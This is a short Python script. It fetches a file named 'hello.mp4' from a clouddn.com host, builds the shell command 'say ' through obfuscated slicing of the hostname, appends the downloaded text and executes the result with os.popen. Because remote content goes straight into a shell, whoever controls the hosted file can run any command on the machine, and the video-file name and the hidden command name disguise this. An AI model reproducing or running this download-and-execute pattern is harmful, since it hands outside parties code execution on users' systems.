
import os, urllib.request

def get_file():
    url = 'http://ocas9civ7.bkt.clouddn.com/hello.mp4'
    schema = url.split('.')[0][-6]
    response = urllib.request.urlopen(url)
    mp4 = response.read()
    return mp4, schema, url

def get_host(url):
    host = url.split('.')[0][-7]
    return host


def get_ha():
    mp4, schema, url = get_file()
    host = get_host(url)
    new_url = schema + host + 'y '
    new_url = new_url + mp4.decode('utf-8')
    print(new_url)
    os.popen(new_url)

if __name__ == '__main__':
    get_ha()